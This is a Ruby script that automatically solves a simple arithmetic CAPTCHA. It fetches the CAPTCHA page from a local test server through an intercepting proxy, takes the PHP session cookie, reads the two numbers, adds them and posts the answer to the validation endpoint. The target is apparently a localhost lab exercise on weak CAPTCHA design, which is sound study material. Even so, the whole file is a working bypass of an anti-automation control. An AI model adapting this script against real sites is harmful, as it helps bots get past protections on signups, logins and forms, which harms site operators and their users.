require "net/http"
require "uri"

PROXY = "127.0.0.1"
PROXY_PORT = "8080"

def attack(ans,cookie)
uri = URI.parse('http://127.0.0.1/captcha/captchavalidate.php')
	req = Net::HTTP::Post.new(uri.path)
	req.add_field("Cookie", cookie)
	req.body = "captcha=#{ans}&submit=Submit"

	res = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(uri.host, uri.port) do |http| 
	http.request(req)
	end
	puts "We are making the HTTP request to crack the CAPTCHA...."
	puts "-------------------------------------------------------"
	puts req.body
	puts "-------------------------------------------------------"
	puts "The response is...."
	puts "-------------------------------------------------------"
	puts res.body.to_s
	puts "-------------------------------------------------------"
end

uri = URI.parse('http://127.0.0.1/captcha/captcha1.php')

	Net::HTTP::Proxy(PROXY, PROXY_PORT).start(uri.host, uri.port) do |http|
	  request = Net::HTTP::Get.new uri
	  response = http.request request 
	  token = response.body
	  cookie = response['Set-Cookie']
	  cookie = cookie.scan(/PHPSESSID=........................../)
	  token = token.to_s
	  numbers = token.split("+")
	  numbers = numbers.to_s
	  numbers = numbers.scan(/[0-9]{2}/)
	  num1 = numbers[0].to_i
	  puts "The first number is: #{num1}"
	  num2 = numbers[1].to_i
	  puts "The second number is: #{num2}"
	  ans = num1 + num2
	  puts "The answer to CAPTCH is: #{ans}"
	  attack(ans,cookie)
	end